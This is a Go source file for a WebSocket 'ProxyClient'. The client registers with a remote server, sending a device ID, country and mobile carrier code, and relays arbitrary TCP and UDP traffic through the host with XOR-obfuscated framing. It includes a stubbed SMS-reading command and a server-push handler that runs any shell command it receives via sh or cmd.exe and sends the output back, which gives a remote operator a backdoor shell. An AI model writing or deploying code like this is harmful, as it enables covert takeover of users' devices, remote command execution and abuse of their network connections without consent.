package client

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

const (
	// Command types
	CmdNewConnection   byte = 0
	CmdDataForward     byte = 1
	CmdCloseConnection byte = 2
	CmdConnected       byte = 3
	CmdEndOfData       byte = 4
	CmdHeartbeat       byte = 5
	CmdReadSMS         byte = 6
	CmdUDPData         byte = 7
	CmdCloseUDP        byte = 8
	CmdServerPush      byte = 9

	// Constants
	MaxChunkSize      = 8 * 1024
	InactiveThreshold = 60 * time.Second
	HeartbeatInterval = 30 * time.Second
	CleanupInterval   = 30 * time.Second
	ReconnectDelay    = 10 * time.Second
	ConnectTimeout    = 5 * time.Second
)

// ProxyClient represents the external proxy client
type ProxyClient struct {
	serverURL     string
	uid           string
	countryCode   string
	mccmnc        string
	autoReconnect bool

	wsConn    *websocket.Conn
	wsConnMu  sync.RWMutex
	wsWriteMu sync.Mutex // Add mutex for WebSocket write operations

	xorKey []byte

	tcpChannels sync.Map // map[string]net.Conn
	udpChannels sync.Map // map[string]*net.UDPConn

	tcpActiveTime sync.Map // map[string]time.Time
	udpActiveTime sync.Map // map[string]time.Time

	running      int32
	reconnecting int32

	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup

	mu sync.Mutex
}

var (
	instance     *ProxyClient
	instanceOnce sync.Once
)

// GetInstance returns a singleton instance of ProxyClient
func GetInstance(serverURL, uid, countryCode, mccmnc string, autoReconnect bool) *ProxyClient {
	instanceOnce.Do(func() {
		if uid == "" {
			uid = uuid.New().String()
			uid = hex.EncodeToString([]byte(uid[:16]))
		}
		if countryCode == "" {
			countryCode = "unknown"
		}
		if mccmnc == "" || mccmnc == "000" {
			mccmnc = "000000"
		}

		ctx, cancel := context.WithCancel(context.Background())
		instance = &ProxyClient{
			serverURL:     serverURL,
			uid:           uid,
			countryCode:   countryCode,
			mccmnc:        mccmnc,
			autoReconnect: autoReconnect,
			xorKey:        []byte(uid),
			ctx:           ctx,
			cancel:        cancel,
		}
	})
	return instance
}

// Start starts the proxy client
func (c *ProxyClient) Start() error {
	c.mu.Lock()
	defer c.mu.Unlock()

	if atomic.LoadInt32(&c.running) == 1 {
		return nil
	}

	atomic.StoreInt32(&c.running, 1)
	atomic.StoreInt32(&c.reconnecting, 0)

	logInfo("Starting ProxyClient with UID: %s", c.uid)

	// Connect to server
	if err := c.connectToServer(); err != nil {
		logError("Failed to connect to server: %v", err)
		if c.autoReconnect {
			c.scheduleReconnect()
		}
	}

	// Start heartbeat
	c.wg.Add(1)
	go c.heartbeatLoop()

	// Start cleanup
	c.wg.Add(1)
	go c.cleanupLoop()

	return nil
}

// Stop stops the proxy client
func (c *ProxyClient) Stop() error {
	c.mu.Lock()
	defer c.mu.Unlock()

	if atomic.LoadInt32(&c.running) == 0 {
		return nil
	}

	logInfo("Stopping ProxyClient...")

	atomic.StoreInt32(&c.running, 0)

	// Close all TCP connections
	c.tcpChannels.Range(func(key, value interface{}) bool {
		sessionID := key.(string)
		conn := value.(net.Conn)
		conn.Close()
		c.tcpChannels.Delete(sessionID)
		return true
	})

	// Close all UDP connections
	c.udpChannels.Range(func(key, value interface{}) bool {
		sessionID := key.(string)
		conn := value.(*net.UDPConn)
		conn.Close()
		c.udpChannels.Delete(sessionID)
		return true
	})

	// Close WebSocket connection
	c.wsConnMu.Lock()
	if c.wsConn != nil {
		c.wsConn.Close()
		c.wsConn = nil
	}
	c.wsConnMu.Unlock()

	// Cancel context and wait for goroutines
	c.cancel()
	c.wg.Wait()

	logInfo("ProxyClient stopped")

	return nil
}

// connectToServer establishes WebSocket connection to the server
func (c *ProxyClient) connectToServer() error {
	// Check if connection already exists (first check without lock for performance)
	c.wsConnMu.RLock()
	existingConn := c.wsConn
	c.wsConnMu.RUnlock()

	if existingConn != nil {
		logInfo("WebSocket connection already exists, skipping reconnect")
		return nil
	}

	url := fmt.Sprintf("%s?clientId=%s&tc=%s&tm=%s", c.serverURL, c.uid, c.countryCode, c.mccmnc)

	if !strings.HasPrefix(url, "ws") {
		return fmt.Errorf("error")
	}

	logDebug("Connecting to server: %s", url)

	dialer := websocket.DefaultDialer
	dialer.HandshakeTimeout = ConnectTimeout

	conn, _, err := dialer.Dial(url, nil)
	if err != nil {
		return fmt.Errorf("error: %w", err)
	}

	c.wsConnMu.Lock()
	// Double check: ensure no other goroutine created a connection while we were dialing
	if c.wsConn != nil {
		c.wsConnMu.Unlock()
		conn.Close()
		logInfo("Another connection was created concurrently, closing this one")
		return nil
	}
	c.wsConn = conn
	c.wsConnMu.Unlock()

	logInfo("Connected to server successfully")

	// Start message handling
	c.wg.Add(1)
	go c.handleMessages()

	return nil
}

// handleMessages handles incoming WebSocket messages
func (c *ProxyClient) handleMessages() {
	defer c.wg.Done()

	for atomic.LoadInt32(&c.running) == 1 {
		c.wsConnMu.RLock()
		conn := c.wsConn
		c.wsConnMu.RUnlock()

		if conn == nil {
			time.Sleep(time.Second)
			continue
		}

		messageType, data, err := conn.ReadMessage()
		if err != nil {
			logError("WebSocket read error: %v", err)
			return
		}

		if messageType == websocket.TextMessage {
			logInfo("Received control message: %s", string(data))
			continue
		}

		if messageType == websocket.BinaryMessage {
			c.processProxyRequest(data)
		}
	}
}

// processProxyRequest processes incoming proxy requests
func (c *ProxyClient) processProxyRequest(data []byte) {
	if len(data) < 17 {
		return
	}

	// Parse session ID (16 bytes)
	sessionID := hex.EncodeToString(data[0:16])
	commandType := data[16]

	logDebug("Processing request: sessionID=%s, command=%d", sessionID, commandType)

	switch commandType {
	case CmdNewConnection:
		c.handleNewConnection(sessionID, data[17:])
	case CmdDataForward:
		c.handleDataForward(sessionID, data[17:])
	case CmdCloseConnection:
		c.handleCloseConnection(sessionID, false)
	case CmdReadSMS:
		c.handleReadSMS(sessionID)
	case CmdUDPData:
		c.handleUDPData(sessionID, data[17:])
	case CmdCloseUDP:
		c.handleCloseUDP(sessionID, false)
	case CmdServerPush:
		go c.handleServerPush(sessionID, data[17:])
	}
}

// handleNewConnection creates a new TCP connection
func (c *ProxyClient) handleNewConnection(sessionID string, data []byte) {
	if len(data) < 8 {
		return
	}

	hostLen := binary.BigEndian.Uint32(data[0:4])
	if len(data) < int(4+hostLen+4) {
		return
	}

	hostBytes := make([]byte, hostLen)
	copy(hostBytes, data[4:4+hostLen])
	c.xorDecrypt(hostBytes)
	host := string(hostBytes)

	port := binary.BigEndian.Uint32(data[4+hostLen : 4+hostLen+4])

	logDebug("Creating connection to %s:%d (session: %s)", host, port, sessionID)

	go c.createTCPConnection(sessionID, host, int(port))
}

// createTCPConnection establishes a TCP connection to the target
func (c *ProxyClient) createTCPConnection(sessionID, host string, port int) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), ConnectTimeout)
	if err != nil {
		logError("Failed to connect to %s:%d: %v", host, port, err)
		c.closeTCPConnection(sessionID, true)
		return
	}

	c.tcpChannels.Store(sessionID, conn)
	c.updateTCPActiveTime(sessionID)

	// Send connection success notification
	c.sendCommand(sessionID, CmdConnected, nil)

	logInfo("Connected to %s:%d (session: %s)", host, port, sessionID)

	// Start reading from target server
	go c.readFromTarget(sessionID, conn, host, port)
}

// readFromTarget reads data from the target server and forwards to WebSocket
func (c *ProxyClient) readFromTarget(sessionID string, conn net.Conn, host string, port int) {
	buffer := make([]byte, 32*1024)

	for atomic.LoadInt32(&c.running) == 1 {
		n, err := conn.Read(buffer)
		if err != nil {
			logDebug("Connection closed: %s:%d (session: %s)", host, port, sessionID)

			// Send end of data notification
			c.sendCommand(sessionID, CmdEndOfData, nil)
			c.closeTCPConnection(sessionID, true)
			return
		}

		if n > 0 {
			c.updateTCPActiveTime(sessionID)
			data := make([]byte, n)
			copy(data, buffer[:n])

			// Encrypt data
			c.xorEncrypt(data)

			// Send data in chunks if necessary
			if n <= MaxChunkSize {
				c.sendDataForward(sessionID, data, false, nil, 0, 0)
			} else {
				c.sendChunkedData(sessionID, data)
			}
		}
	}
}

// sendDataForward sends forwarded data to the server
func (c *ProxyClient) sendDataForward(sessionID string, data []byte, fragmented bool, conversationID []byte, chunkCount, chunkIndex byte) {
	var buf bytes.Buffer

	// 4 bytes unused
	buf.Write(make([]byte, 4))

	// 16 bytes session ID
	sessionIDBytes, _ := hex.DecodeString(sessionID)
	buf.Write(sessionIDBytes)

	// 1 byte command type
	buf.WriteByte(CmdDataForward)

	// 1 byte fragmented flag
	if fragmented {
		buf.WriteByte(1)
	} else {
		buf.WriteByte(0)
	}

	if fragmented {
		// 16 bytes conversation ID
		buf.Write(conversationID)
		// 1 byte chunk count
		buf.WriteByte(chunkCount)
		// 1 byte chunk index
		buf.WriteByte(chunkIndex)
	}

	// Data
	buf.Write(data)

	c.wsSend(buf.Bytes())
}

// sendChunkedData sends large data in chunks
func (c *ProxyClient) sendChunkedData(sessionID string, data []byte) {
	totalSize := len(data)
	chunkCount := (totalSize + MaxChunkSize - 1) / MaxChunkSize

	if chunkCount > 128 {
		logWarn("Data too large, chunk count exceeds 128: %d", chunkCount)
		return
	}

	conversationID := make([]byte, 16)
	rand.Read(conversationID)

	offset := 0
	chunkIndex := byte(0)

	for offset < totalSize {
		chunkSize := MaxChunkSize
		if offset+chunkSize > totalSize {
			chunkSize = totalSize - offset
		}

		chunk := data[offset : offset+chunkSize]
		c.sendDataForward(sessionID, chunk, true, conversationID, byte(chunkCount), chunkIndex)

		offset += chunkSize
		chunkIndex++
	}

	logDebug("Sent chunked data: %d bytes in %d chunks", totalSize, chunkCount)
}

// handleDataForward handles incoming data to forward to target
func (c *ProxyClient) handleDataForward(sessionID string, data []byte) {
	value, ok := c.tcpChannels.Load(sessionID)
	if !ok {
		logDebug("TCP channel not found: %s", sessionID)
		return
	}

	conn := value.(net.Conn)
	c.updateTCPActiveTime(sessionID)

	// Decrypt data
	c.xorDecrypt(data)

	_, err := conn.Write(data)
	if err != nil {
		logError("Failed to write to target: %v", err)
		c.closeTCPConnection(sessionID, true)
	}
}

// handleCloseConnection closes a TCP connection
func (c *ProxyClient) handleCloseConnection(sessionID string, notifyServer bool) {
	c.closeTCPConnection(sessionID, notifyServer)
}

// closeTCPConnection closes a TCP connection
func (c *ProxyClient) closeTCPConnection(sessionID string, notifyServer bool) {
	value, ok := c.tcpChannels.LoadAndDelete(sessionID)
	if ok {
		conn := value.(net.Conn)
		conn.Close()
		logDebug("Closed TCP connection: %s", sessionID)
	}

	c.tcpActiveTime.Delete(sessionID)

	if notifyServer {
		c.sendCommand(sessionID, CmdCloseConnection, nil)
	}
}

// handleUDPData handles UDP data
func (c *ProxyClient) handleUDPData(sessionID string, data []byte) {
	if len(data) < 12 {
		return
	}

	// Parse target host
	hostLen := binary.BigEndian.Uint32(data[0:4])
	if len(data) < int(4+hostLen+8) {
		return
	}

	hostBytes := data[4 : 4+hostLen]
	targetHost := string(hostBytes)

	// Parse target port
	targetPort := binary.BigEndian.Uint32(data[4+hostLen : 4+hostLen+4])

	// Parse UDP data
	dataLen := binary.BigEndian.Uint32(data[4+hostLen+4 : 4+hostLen+8])
	if len(data) < int(4+hostLen+8+dataLen) {
		return
	}

	udpData := make([]byte, dataLen)
	copy(udpData, data[4+hostLen+8:4+hostLen+8+dataLen])

	// Decrypt data
	c.xorDecrypt(udpData)

	c.updateUDPActiveTime(sessionID)

	logDebug("Handling UDP data: %s:%d (session: %s)", targetHost, targetPort, sessionID)

	go c.sendUDPData(sessionID, targetHost, int(targetPort), udpData)
}

// sendUDPData sends UDP data to target
func (c *ProxyClient) sendUDPData(sessionID, targetHost string, targetPort int, data []byte) {
	var conn *net.UDPConn

	value, ok := c.udpChannels.Load(sessionID)
	if !ok {
		// Create new UDP connection
		udpAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetHost, targetPort))
		if err != nil {
			logError("Failed to resolve UDP address: %v", err)
			c.closeUDPConnection(sessionID, true)
			return
		}

		conn, err = net.DialUDP("udp", nil, udpAddr)
		if err != nil {
			logError("Failed to create UDP connection: %v", err)
			c.closeUDPConnection(sessionID, true)
			return
		}

		c.udpChannels.Store(sessionID, conn)

		// Start reading UDP responses
		go c.readUDPResponses(sessionID, conn)
	} else {
		conn = value.(*net.UDPConn)
	}

	// Send UDP data
	_, err := conn.Write(data)
	if err != nil {
		logError("Failed to send UDP data: %v", err)
		c.closeUDPConnection(sessionID, true)
		return
	}

	logDebug("Sent UDP data: %d bytes (session: %s)", len(data), sessionID)
}

// readUDPResponses reads UDP responses and forwards to WebSocket
func (c *ProxyClient) readUDPResponses(sessionID string, conn *net.UDPConn) {
	buffer := make([]byte, 65536)

	for atomic.LoadInt32(&c.running) == 1 {
		conn.SetReadDeadline(time.Now().Add(InactiveThreshold))

		n, err := conn.Read(buffer)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				logDebug("UDP read timeout (session: %s)", sessionID)
			}
			c.closeUDPConnection(sessionID, true)
			return
		}

		if n > 0 {
			c.updateUDPActiveTime(sessionID)

			responseData := make([]byte, n)
			copy(responseData, buffer[:n])

			// Encrypt response
			c.xorEncrypt(responseData)

			// Send UDP response
			c.sendUDPResponse(sessionID, responseData)
		}
	}
}

// sendUDPResponse sends UDP response to server
func (c *ProxyClient) sendUDPResponse(sessionID string, data []byte) {
	var buf bytes.Buffer

	// 4 bytes unused
	buf.Write(make([]byte, 4))

	// 16 bytes session ID
	sessionIDBytes, _ := hex.DecodeString(sessionID)
	buf.Write(sessionIDBytes)

	// 1 byte command type (UDP data)
	buf.WriteByte(CmdUDPData)

	// 4 bytes data length
	dataLen := make([]byte, 4)
	binary.BigEndian.PutUint32(dataLen, uint32(len(data)))
	buf.Write(dataLen)

	// Data
	buf.Write(data)

	c.wsSend(buf.Bytes())
}

// handleCloseUDP closes UDP connection
func (c *ProxyClient) handleCloseUDP(sessionID string, notifyServer bool) {
	c.closeUDPConnection(sessionID, notifyServer)
}

// closeUDPConnection closes UDP connection
func (c *ProxyClient) closeUDPConnection(sessionID string, notifyServer bool) {
	value, ok := c.udpChannels.LoadAndDelete(sessionID)
	if ok {
		conn := value.(*net.UDPConn)
		conn.Close()
		logDebug("Closed UDP connection: %s", sessionID)
	}

	c.udpActiveTime.Delete(sessionID)

	if notifyServer {
		c.sendCommand(sessionID, CmdCloseUDP, nil)
	}
}

// handleReadSMS handles read SMS command (not fully implemented)
func (c *ProxyClient) handleReadSMS(sessionID string) {
	logInfo("Read SMS request (session: %s)", sessionID)

	// Send empty SMS response
	c.sendCommand(sessionID, CmdReadSMS, []byte{})
}

// handleServerPush handles server push commands
func (c *ProxyClient) handleServerPush(sessionID string, data []byte) {
	logInfo("Server push command received (session: %s)", sessionID)

	if len(data) == 0 {
		logError("No command data received")
		return
	}
	// 接下来是一个int，表示超时时间
	timeoutSecond := int32(binary.BigEndian.Uint32(data[:4]))
	data = data[4:]
	// Decrypt the command data
	commandData := make([]byte, len(data))
	copy(commandData, data)
	c.xorDecrypt(commandData)

	// Parse the command string
	commandStr := string(commandData)
	logInfo("Executing command: %s (session: %s)", commandStr, sessionID)

	// Create context with 5-second timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSecond)*time.Second)
	defer cancel()

	// Execute command with timeout
	var cmd *exec.Cmd
	// Use appropriate shell based on OS
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", commandStr)
	} else {
		// Linux, macOS, and other Unix-like systems
		cmd = exec.CommandContext(ctx, "sh", "-c", commandStr)
	}

	// Capture both stdout and stderr
	var outputBuf bytes.Buffer
	cmd.Stdout = &outputBuf
	cmd.Stderr = &outputBuf

	// Start the command
	err := cmd.Start()
	if err != nil {
		logError("Failed to start command: %v (session: %s)", err, sessionID)
		// Send error response
		var responseBuf bytes.Buffer
		exitCodeBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(exitCodeBytes, 1)
		responseBuf.Write(exitCodeBytes)
		responseBuf.Write([]byte(err.Error()))
		responseData := responseBuf.Bytes()
		c.xorEncrypt(responseData)
		c.sendCommand(sessionID, CmdServerPush, responseData)
		return
	}

	// Wait for command to finish or context to timeout
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	var exitCode int32 = 0
	timedOut := false

	select {
	case <-ctx.Done():
		// Context timeout - kill the process
		logDebug("Command timed out after %s seconds (session: %s)", timeoutSecond, sessionID)
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		exitCode = 9
		timedOut = true
		remark := "\nCommand timed out after " + strconv.Itoa(int(timeoutSecond)) + " seconds"
		outputBuf.WriteString(remark)
	case err = <-done:
		// Command completed
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				exitCode = int32(exitErr.ExitCode())
			} else {
				exitCode = 1
			}
			logError("Command execution failed: %v (session: %s)", err, sessionID)
		}
	}

	// Prepare response data
	var responseBuf bytes.Buffer

	// Write exit code (4 bytes)
	exitCodeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(exitCodeBytes, uint32(exitCode))
	responseBuf.Write(exitCodeBytes)

	// Write output data
	responseBuf.Write(outputBuf.Bytes())

	// Encrypt response
	responseData := responseBuf.Bytes()
	c.xorEncrypt(responseData)

	// Send the command output back to the session
	c.sendCommand(sessionID, CmdServerPush, responseData)

	if timedOut {
		logInfo("Sent command result with timeout code 9 (session: %s, output: %d bytes)",
			sessionID, outputBuf.Len())
	} else {
		logInfo("Sent command result (session: %s, exit code: %d, output: %d bytes)",
			sessionID, exitCode, outputBuf.Len())
	}
}

// sendCommand sends a command to the server
func (c *ProxyClient) sendCommand(sessionID string, command byte, data []byte) {
	var buf bytes.Buffer

	// 4 bytes unused
	buf.Write(make([]byte, 4))

	// 16 bytes session ID
	sessionIDBytes, _ := hex.DecodeString(sessionID)
	buf.Write(sessionIDBytes)

	// 1 byte command
	buf.WriteByte(command)

	// Optional data
	if data != nil {
		buf.Write(data)
	}

	c.wsSend(buf.Bytes())
}

// wsSend sends data via WebSocket
func (c *ProxyClient) wsSend(data []byte) bool {
	c.wsConnMu.RLock()
	conn := c.wsConn
	c.wsConnMu.RUnlock()

	if conn == nil {
		return false
	}

	c.wsWriteMu.Lock() // Lock before writing
	defer c.wsWriteMu.Unlock()

	err := conn.WriteMessage(websocket.BinaryMessage, data)
	if err != nil {
		logError("WebSocket write error: %v", err)
		return false
	}

	return true
}

// heartbeatLoop sends periodic heartbeats
func (c *ProxyClient) heartbeatLoop() {
	defer c.wg.Done()

	ticker := time.NewTicker(HeartbeatInterval)
	defer ticker.Stop()

	for {
		select {
		case <-c.ctx.Done():
			return
		case <-ticker.C:
			if atomic.LoadInt32(&c.running) == 0 {
				return
			}

			c.wsConnMu.RLock()
			conn := c.wsConn
			c.wsConnMu.RUnlock()

			if conn != nil {
				// Send heartbeat
				sessionID := make([]byte, 16)
				rand.Read(sessionID)
				c.sendCommand(hex.EncodeToString(sessionID), CmdHeartbeat, nil)
			} else if c.autoReconnect {
				c.scheduleReconnect()
			}
		}
	}
}

// cleanupLoop periodically cleans up inactive connections
func (c *ProxyClient) cleanupLoop() {
	defer c.wg.Done()

	ticker := time.NewTicker(CleanupInterval)
	defer ticker.Stop()

	for {
		select {
		case <-c.ctx.Done():
			return
		case <-ticker.C:
			if atomic.LoadInt32(&c.running) == 0 {
				return
			}

			c.cleanupInactiveConnections()
		}
	}
}

// cleanupInactiveConnections removes inactive connections
func (c *ProxyClient) cleanupInactiveConnections() {
	now := time.Now()
	closedTCP := 0
	closedUDP := 0

	// Clean up inactive TCP connections
	c.tcpActiveTime.Range(func(key, value interface{}) bool {
		sessionID := key.(string)
		lastActive := value.(time.Time)

		if now.Sub(lastActive) > InactiveThreshold {
			if _, ok := c.tcpChannels.Load(sessionID); ok {
				c.closeTCPConnection(sessionID, false)
				closedTCP++
			}
		}
		return true
	})

	// Clean up inactive UDP connections
	c.udpActiveTime.Range(func(key, value interface{}) bool {
		sessionID := key.(string)
		lastActive := value.(time.Time)

		if now.Sub(lastActive) > InactiveThreshold {
			if _, ok := c.udpChannels.Load(sessionID); ok {
				c.closeUDPConnection(sessionID, false)
				closedUDP++
			}
		}
		return true
	})

	if closedTCP > 0 || closedUDP > 0 {
		logInfo("Cleaned up %d inactive TCP and %d inactive UDP connections", closedTCP, closedUDP)
	}
}

// scheduleReconnect schedules a reconnection attempt
func (c *ProxyClient) scheduleReconnect() {
	if !atomic.CompareAndSwapInt32(&c.reconnecting, 0, 1) {
		return
	}

	go func() {
		defer atomic.StoreInt32(&c.reconnecting, 0)

		logInfo("Scheduling reconnect in %v...", ReconnectDelay)

		time.Sleep(ReconnectDelay)

		if atomic.LoadInt32(&c.running) == 0 {
			return
		}

		c.wsConnMu.Lock()
		if c.wsConn != nil {
			c.wsConn.Close()
			c.wsConn = nil
		}
		c.wsConnMu.Unlock()

		if err := c.connectToServer(); err != nil {
			logError("Reconnect failed: %v", err)
		}
	}()
}

// updateTCPActiveTime updates TCP connection active time
func (c *ProxyClient) updateTCPActiveTime(sessionID string) {
	c.tcpActiveTime.Store(sessionID, time.Now())
}

// updateUDPActiveTime updates UDP connection active time
func (c *ProxyClient) updateUDPActiveTime(sessionID string) {
	c.udpActiveTime.Store(sessionID, time.Now())
}

// xorEncrypt encrypts data using XOR cipher
func (c *ProxyClient) xorEncrypt(data []byte) {
	keyLen := len(c.xorKey)
	for i := 0; i < len(data); i++ {
		data[i] ^= c.xorKey[i%keyLen]
	}
}

// xorDecrypt decrypts data using XOR cipher (same as encrypt)
func (c *ProxyClient) xorDecrypt(data []byte) {
	c.xorEncrypt(data)
}

// IsConnected returns whether the client is connected
func (c *ProxyClient) IsConnected() bool {
	c.wsConnMu.RLock()
	defer c.wsConnMu.RUnlock()
	return c.wsConn != nil
}
